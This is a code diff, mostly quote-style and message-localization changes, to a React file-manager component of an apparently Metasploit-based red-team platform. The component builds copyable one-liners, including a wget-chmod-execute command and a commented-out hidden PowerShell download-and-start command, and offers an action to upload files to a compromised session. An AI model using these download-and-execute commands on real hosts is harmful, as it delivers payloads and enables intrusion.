@@ -1,15 +1,15 @@
-import React, { Fragment, memo, useImperativeHandle, useState } from "react";
-import moment from "moment";
-import { getLocale, useRequest } from "umi";
-import { deleteMsgrpcFileMsfAPI, getMsgrpcFileMsfAPI, postPostmodulePostModuleActuatorAPI } from "@/services/apiv1";
+import React, { Fragment, memo, useImperativeHandle, useState } from 'react';
+import moment from 'moment';
+import { getLocale, useRequest } from 'umi';
+import { deleteMsgrpcFileMsfAPI, getMsgrpcFileMsfAPI, postPostmodulePostModuleActuatorAPI } from '@/services/apiv1';
 
-import { Button, Card, Col, message, Modal, Row, Space, Table, Tag, Upload } from "antd";
-import { CopyOutlined, SyncOutlined, UploadOutlined } from "@ant-design/icons";
-import copy from "copy-to-clipboard";
-import styles from "./FileMsf.less";
-import { getToken } from "@/utils/authority";
-import { Downheight } from "@/utils/utils";
-import { formatText, manuali18n, msgsuccess } from "@/utils/locales";
+import { Button, Card, Col, message, Modal, Row, Space, Table, Tag, Upload } from 'antd';
+import { CopyOutlined, SyncOutlined, UploadOutlined } from '@ant-design/icons';
+import copy from 'copy-to-clipboard';
+import styles from './FileMsf.less';
+import { getToken } from '@/utils/authority';
+import { Downheight } from '@/utils/utils';
+import { formatText, manuali18n, msgerror, msgsuccess, msgwarning } from '@/utils/locales';
 
 String.prototype.format = function() {
   let args = arguments;
@@ -19,19 +19,19 @@ String.prototype.format = function() {
 };
 
 const { Dragger } = Upload;
-const fileMsfUploadPath = "/api/v1/msgrpc/filemsf/?";
-const webHost = location.hostname + (location.port ? `:${location.port}` : "");
+const fileMsfUploadPath = '/api/v1/msgrpc/filemsf/?';
+const webHost = location.hostname + (location.port ? `:${location.port}` : '');
 
 const downloadFileWayDetail = item => {
-  const download_router = "/api/v1/d/?en=";
+  const download_router = '/api/v1/d/?en=';
   const download_url = `${location.protocol}//${webHost}${download_router}${item.enfilename}`;
 
   const filename = item.name;
   const data = [
     {
-      key: "0",
-      name: "浏览器下载",
-      cmd: `${download_url}`
+      key: '0',
+      name: '浏览器下载',
+      cmd: `${download_url}`,
     },
     // {
     //   key: '1',
@@ -59,60 +59,60 @@ const downloadFileWayDetail = item => {
     //   cmd: `cmd.exe /c powershell.exe -ExecutionPolicy bypass -noprofile -windowstyle hidden (new-object system.net.webclient).downloadfile('${download_url}','${filename}');start-process ${filename}`,
     // },
     {
-      key: "6",
-      name: "linux下载",
-      cmd: `wget -O ${filename} --no-check-certificate ${download_url}`
+      key: '6',
+      name: 'linux下载',
+      cmd: `wget -O ${filename} --no-check-certificate ${download_url}`,
     },
     {
-      key: "7",
-      name: "linux下载执行elf",
-      cmd: `wget -O ${filename} --no-check-certificate ${download_url} && chmod 755 ${filename} && ./${filename} `
-    }
+      key: '7',
+      name: 'linux下载执行elf',
+      cmd: `wget -O ${filename} --no-check-certificate ${download_url} && chmod 755 ${filename} && ./${filename} `,
+    },
   ];
 
   const columns = [
     {
-      title: "操作",
-      dataIndex: "name",
-      key: "key",
-      width: 160
+      title: '操作',
+      dataIndex: 'name',
+      key: 'key',
+      width: 160,
     },
     {
-      title: "命令",
-      dataIndex: "cmd",
-      ellipsis: true
+      title: '命令',
+      dataIndex: 'cmd',
+      ellipsis: true,
     },
     {
-      title: "Action",
-      key: "action",
+      title: 'Action',
+      key: 'action',
       width: 100,
       render: (text, record) => (
         <Button
           block
-          icon={<CopyOutlined />}
+          icon={<CopyOutlined/>}
           onClick={() => {
             copy(record.cmd);
-            msgsuccess("已复制到剪切板", "Copyed to clipboard");
+            msgsuccess('已复制到剪切板', 'Copyed to clipboard');
           }}
-        >{manuali18n("复制", "Copy")}</Button>
-      )
-    }
+        >{manuali18n('复制', 'Copy')}</Button>
+      ),
+    },
   ];
 
   Modal.info({
     icon: null,
-    className: "styles.oneClickDownload",
-    bodyStyle: { padding: "0px 0px 0px 0px" },
+    className: 'styles.oneClickDownload',
+    bodyStyle: { padding: '0px 0px 0px 0px' },
     mask: false,
-    width: "70vw",
-    content: <Table size="small" columns={columns} dataSource={data} pagination={false} />,
+    width: '70vw',
+    content: <Table size="small" columns={columns} dataSource={data} pagination={false}/>,
     onOk() {
-    }
+    },
   });
 };
 
 const FileMsf = props => {
-  console.log("FileMsf");
+  console.log('FileMsf');
   const [msfUploading, setMsfUploading] = useState(false);
   const [fileMsfListActive, setFileMsfListActive] = useState([]);
 
@@ -120,7 +120,7 @@ const FileMsf = props => {
     return {
       updateData: () => {
         listFileMsfReq.run();
-      }
+      },
     };
   });
   const initListFileMsfReq = useRequest(getMsgrpcFileMsfAPI, {
@@ -128,35 +128,35 @@ const FileMsf = props => {
       setFileMsfListActive(result);
     },
     onError: (error, params) => {
-    }
+    },
   });
 
   const listFileMsfForViewReq = useRequest(getMsgrpcFileMsfAPI, {
     manual: true,
     onSuccess: (result, params) => {
-      if (result.type === "img") {
+      if (result.type === 'img') {
         Modal.info({
           icon: null,
-          bodyStyle: { padding: "0 0 0 0" },
+          bodyStyle: { padding: '0 0 0 0' },
           mask: false,
-          width: "80vw",
-          content: <img style={{ width: "100%" }} src={`data:image/png;base64,${result.data}`} />
+          width: '80vw',
+          content: <img style={{ width: '100%' }} src={`data:image/png;base64,${result.data}`}/>,
         });
       } else {
         Modal.info({
           icon: null,
           style: {
             top: 40,
-            padding: "0px 0px 0px 0px"
+            padding: '0px 0px 0px 0px',
           },
           mask: false,
-          width: "70vw",
+          width: '70vw',
           content: (
             <Fragment>
               <pre
                 style={{
-                  width: "100%",
-                  maxHeight: "60vh"
+                  width: '100%',
+                  maxHeight: '60vh',
                 }}
               >
                 {atob(result.data)}
@@ -165,23 +165,23 @@ const FileMsf = props => {
                 <Button
                   onClick={() => {
                     copy(atob(result.data));
-                    message.success("Copyed to clipboard");
+                    msgsuccess('已拷贝到剪切板', 'Copyed to clipboard');
                   }}
                 >
                   Copy to clipboard
                 </Button>
               </Row>
             </Fragment>
-          )
+          ),
         });
       }
     },
     onError: (error, params) => {
-    }
+    },
   });
 
   const listFileMsfForView = name => {
-    listFileMsfForViewReq.run({ name, action: "view" });
+    listFileMsfForViewReq.run({ name, action: 'view' });
   };
 
   const listFileMsfForDownloadReq = useRequest(getMsgrpcFileMsfAPI, {
@@ -189,7 +189,7 @@ const FileMsf = props => {
     onSuccess: (result, params) => {
     },
     onError: (error, params) => {
-    }
+    },
   });
 
   const listFileMsfForDownload = name => {
@@ -202,24 +202,24 @@ const FileMsf = props => {
       setFileMsfListActive(result);
     },
     onError: (error, params) => {
-    }
+    },
   });
 
   const createFileMsfUploadOnChange = info => {
-    if (info.file.status === "uploading" && msfUploading === false) {
+    if (info.file.status === 'uploading' && msfUploading === false) {
       setMsfUploading(true);
     }
-    if (info.file.status === "done") {
+    if (info.file.status === 'done') {
       if (200 <= info.file.response.code < 300) {
-        message.success(info.file.response.message);
+        msgsuccess('文件上传成功', 'File upload success');
         listFileMsfReq.run();
       } else {
-        message.warning(info.file.response.message);
+        msgwarning('文件上传失败', 'File upload failed');
       }
       setMsfUploading(false);
-    } else if (info.file.status === "error") {
+    } else if (info.file.status === 'error') {
       setMsfUploading(false);
-      message.error(`${info.file.name} ${formatText("app.filemsf.uploaderror")}`);
+      msgerror(`${info.file.name} 上传失败`, `${info.file.name} upload error`);
     }
   };
 
@@ -229,11 +229,11 @@ const FileMsf = props => {
       listFileMsfReq.run();
     },
     onError: (error, params) => {
-    }
+    },
   });
 
   const operWidth = () => {
-    if (getLocale() === "en-US") {
+    if (getLocale() === 'en-US') {
       return 320;
     } else {
       return 240;
@@ -244,7 +244,7 @@ const FileMsf = props => {
     <Fragment>
       <Row
         style={{
-          marginTop: -16
+          marginTop: -16,
         }}
         gutter={0}
       >
@@ -257,13 +257,13 @@ const FileMsf = props => {
             showUploadList={false}
             loading={msfUploading}
           >
-            <UploadOutlined /> {formatText("app.filemsf.uploadlabel")}
+            <UploadOutlined/> {formatText('app.filemsf.uploadlabel')}
           </Dragger>
         </Col>
         <Col span={18}>
           <Button
             block
-            icon={<SyncOutlined />}
+            icon={<SyncOutlined/>}
             onClick={() => listFileMsfReq.run()}
             loading={
               listFileMsfReq.loading ||
@@ -272,68 +272,68 @@ const FileMsf = props => {
               msfUploading
             }
           >
-            {formatText("app.core.refresh")}
+            {formatText('app.core.refresh')}
           </Button>
           <Table
             className={styles.filesTable}
-            scroll={{ y: "calc({0} - 32px)".format(Downheight) }}
+            scroll={{ y: 'calc({0} - 32px)'.format(Downheight) }}
             size="small"
             bordered
             pagination={false}
             rowKey="id"
             columns={[
               {
-                title: formatText("app.filemsf.filename"),
-                dataIndex: "name",
-                key: "name",
-                render: (text, record) => <span>{record.name}</span>
+                title: formatText('app.filemsf.filename'),
+                dataIndex: 'name',
+                key: 'name',
+                render: (text, record) => <span>{record.name}</span>,
               },
               {
-                title: formatText("app.filemsf.size"),
-                dataIndex: "format_size",
-                key: "format_size",
-                width: 96
+                title: formatText('app.filemsf.size'),
+                dataIndex: 'format_size',
+                key: 'format_size',
+                width: 96,
               },
               {
-                title: formatText("app.filemsf.mtime"),
-                dataIndex: "mtime",
-                key: "mtime",
+                title: formatText('app.filemsf.mtime'),
+                dataIndex: 'mtime',
+                key: 'mtime',
                 width: 120,
                 render: (text, record) => (
-                  <Tag color="cyan">{moment(record.mtime * 1000).format("YYYY-MM-DD HH:mm")}</Tag>
-                )
+                  <Tag color="cyan">{moment(record.mtime * 1000).format('YYYY-MM-DD HH:mm')}</Tag>
+                ),
               },
               {
-                dataIndex: "operation",
+                dataIndex: 'operation',
                 width: operWidth(),
                 render: (text, record) => (
-                  <div style={{ textAlign: "center" }}>
+                  <div style={{ textAlign: 'center' }}>
                     <Space size="middle">
                       {record.size <= 1024 * 1024 ? (
                         <Fragment>
                           <a
-                            style={{ color: "green" }}
+                            style={{ color: 'green' }}
                             onClick={() => listFileMsfForView(record.name)}
                           >
-                            {formatText("app.filemsf.view")}
+                            {formatText('app.filemsf.view')}
                           </a>
                         </Fragment>
                       ) : (
                         <Fragment>
-                          <a style={{ visibility: "Hidden" }}>占位</a>
+                          <a style={{ visibility: 'Hidden' }}>占位</a>
                         </Fragment>
                       )}
-                      <a onClick={() => listFileMsfForDownload(record.name)}>{formatText("app.filemsf.download")}</a>
-                      <a style={{ color: "#faad14" }} onClick={() => downloadFileWayDetail(record)}>
-                        {formatText("app.filemsf.onelinecmd")}
+                      <a onClick={() => listFileMsfForDownload(record.name)}>{formatText('app.filemsf.download')}</a>
+                      <a style={{ color: '#faad14' }} onClick={() => downloadFileWayDetail(record)}>
+                        {formatText('app.filemsf.onelinecmd')}
                       </a>
-                      <a onClick={() => destoryFileMsfReq.run(record)} style={{ color: "red" }}>
-                        {formatText("app.core.delete")}
+                      <a onClick={() => destoryFileMsfReq.run(record)} style={{ color: 'red' }}>
+                        {formatText('app.core.delete')}
                       </a>
                     </Space>
                   </div>
-                )
-              }
+                ),
+              },
             ]}
             dataSource={fileMsfListActive}
           />
@@ -345,18 +345,18 @@ const FileMsf = props => {
 export const FileMsfMemo = memo(FileMsf);
 
 export const FileMsfModal = props => {
-  console.log("FileMsfModal");
+  console.log('FileMsfModal');
   const { hostAndSessionActive, dirpath } = props;
   const [msfUploading, setMsfUploading] = useState(false);
   const [fileMsfListActive, setFileMsfListActive] = useState([]);
-  const fileMsfUploadPath = "/api/v1/msgrpc/filemsf/?";
+  const fileMsfUploadPath = '/api/v1/msgrpc/filemsf/?';
 
   const initListFileMsfReq = useRequest(getMsgrpcFileMsfAPI, {
     onSuccess: (result, params) => {
       setFileMsfListActive(result);
     },
     onError: (error, params) => {
-    }
+    },
   });
 
   const listFileMsfReq = useRequest(getMsgrpcFileMsfAPI, {
@@ -365,7 +365,7 @@ export const FileMsfModal = props => {
       setFileMsfListActive(result);
     },
     onError: (error, params) => {
-    }
+    },
   });
 
   const listFileMsfForDownloadReq = useRequest(getMsgrpcFileMsfAPI, {
@@ -373,7 +373,7 @@ export const FileMsfModal = props => {
     onSuccess: (result, params) => {
     },
     onError: (error, params) => {
-    }
+    },
   });
 
   const createPostModuleActuatorReq = useRequest(postPostmodulePostModuleActuatorAPI, {
@@ -381,7 +381,7 @@ export const FileMsfModal = props => {
     onSuccess: (result, params) => {
     },
     onError: (error, params) => {
-    }
+    },
   });
 
   const destoryFileMsfReq = useRequest(deleteMsgrpcFileMsfAPI, {
@@ -390,24 +390,24 @@ export const FileMsfModal = props => {
       listFileMsfReq.run();
     },
     onError: (error, params) => {
-    }
+    },
   });
 
   const createFileMsfUploadOnChange = info => {
-    if (info.file.status === "uploading" && msfUploading === false) {
+    if (info.file.status === 'uploading' && msfUploading === false) {
       setMsfUploading(true);
     }
-    if (info.file.status === "done") {
+    if (info.file.status === 'done') {
       if (200 <= info.file.response.code < 300) {
-        message.success(info.file.response.message);
+        msgsuccess('文件上传成功', 'File upload success');
         listFileMsfReq.run();
       } else {
-        message.warning(info.file.response.message);
+        msgwarning('文件上传失败', 'File upload failed');
       }
       setMsfUploading(false);
-    } else if (info.file.status === "error") {
+    } else if (info.file.status === 'error') {
       setMsfUploading(false);
-      message.error(`${info.file.name} ${formatText("app.filemsf.uploaderror")}`);
+      msgerror(`${info.file.name} 上传失败`, `${info.file.name} upload error`);
     }
   };
 
@@ -417,10 +417,10 @@ export const FileMsfModal = props => {
         style={{
           marginTop: -12,
           marginLeft: -16,
-          marginRight: -16
+          marginRight: -16,
         }}
         bordered
-        bodyStyle={{ padding: "0px 0px 0px 0px" }}
+        bodyStyle={{ padding: '0px 0px 0px 0px' }}
       >
         <Table
           className={styles.filesTableModal}
@@ -431,59 +431,59 @@ export const FileMsfModal = props => {
           rowKey="id"
           columns={[
             {
-              title: formatText("app.filemsf.filename"),
-              dataIndex: "name",
-              key: "name",
-              render: (text, record) => <span>{record.name}</span>
+              title: formatText('app.filemsf.filename'),
+              dataIndex: 'name',
+              key: 'name',
+              render: (text, record) => <span>{record.name}</span>,
             },
             {
-              title: formatText("app.filemsf.size"),
-              dataIndex: "format_size",
-              key: "format_size",
-              width: 96
+              title: formatText('app.filemsf.size'),
+              dataIndex: 'format_size',
+              key: 'format_size',
+              width: 96,
             },
             {
-              title: formatText("app.filemsf.mtime"),
-              dataIndex: "mtime",
-              key: "mtime",
+              title: formatText('app.filemsf.mtime'),
+              dataIndex: 'mtime',
+              key: 'mtime',
               width: 120,
               render: (text, record) => (
-                <Tag color="cyan">{moment(record.mtime * 1000).format("YYYY-MM-DD HH:mm")}</Tag>
-              )
+                <Tag color="cyan">{moment(record.mtime * 1000).format('YYYY-MM-DD HH:mm')}</Tag>
+              ),
             },
             {
-              dataIndex: "operation",
+              dataIndex: 'operation',
               render: (text, record) => (
-                <div style={{ textAlign: "center" }}>
+                <div style={{ textAlign: 'center' }}>
                   <Space>
                     <a
-                      style={{ color: "green" }}
+                      style={{ color: 'green' }}
                       onClick={() =>
                         createPostModuleActuatorReq.run({
                           ipaddress: hostAndSessionActive.ipaddress,
-                          loadpath: "MODULES.FileSessionUploadModule",
+                          loadpath: 'MODULES.FileSessionUploadModule',
                           sessionid: hostAndSessionActive.session.id,
                           custom_param: JSON.stringify({
                             SESSION_DIR: dirpath,
-                            MSF_FILE: record.name
-                          })
+                            MSF_FILE: record.name,
+                          }),
                         })
                       }
                     >
-                      {formatText("app.filemsf.uploadtotarget")}
+                      {formatText('app.filemsf.uploadtotarget')}
                     </a>
                     <a
-                      onClick={() => listFileMsfForDownloadReq.run({ name: record.name })}>{formatText("app.filemsf.download")}</a>
+                      onClick={() => listFileMsfForDownloadReq.run({ name: record.name })}>{formatText('app.filemsf.download')}</a>
                     <a
                       onClick={() => destoryFileMsfReq.run({ name: record.name })}
-                      style={{ color: "red" }}
+                      style={{ color: 'red' }}
                     >
-                      {formatText("app.core.delete")}
+                      {formatText('app.core.delete')}
                     </a>
                   </Space>
                 </div>
-              )
-            }
+              ),
+            },
           ]}
           dataSource={fileMsfListActive}
         />
@@ -492,7 +492,7 @@ export const FileMsfModal = props => {
         style={{
           marginLeft: -16,
           marginRight: -16,
-          marginBottom: -12
+          marginBottom: -12,
         }}
         gutter={1}
       >
@@ -506,17 +506,17 @@ export const FileMsfModal = props => {
             showUploadList={{
               showRemoveIcon: true,
               showPreviewIcon: false,
-              showDownloadIcon: false
+              showDownloadIcon: false,
             }}
           >
-            <UploadOutlined /> {formatText("app.filemsf.uploadlabel")}
+            <UploadOutlined/> {formatText('app.filemsf.uploadlabel')}
           </Dragger>
         </Col>
         <Col span={8}>
           <Button
             block
             style={{ height: 64 }}
-            icon={<SyncOutlined />}
+            icon={<SyncOutlined/>}
             onClick={() => listFileMsfReq.run()}
             loading={
               listFileMsfReq.loading ||
@@ -524,7 +524,7 @@ export const FileMsfModal = props => {
               createPostModuleActuatorReq.loading
             }
           >
-            {formatText("app.core.refresh")}
+            {formatText('app.core.refresh')}
           </Button>
         </Col>
       </Row>
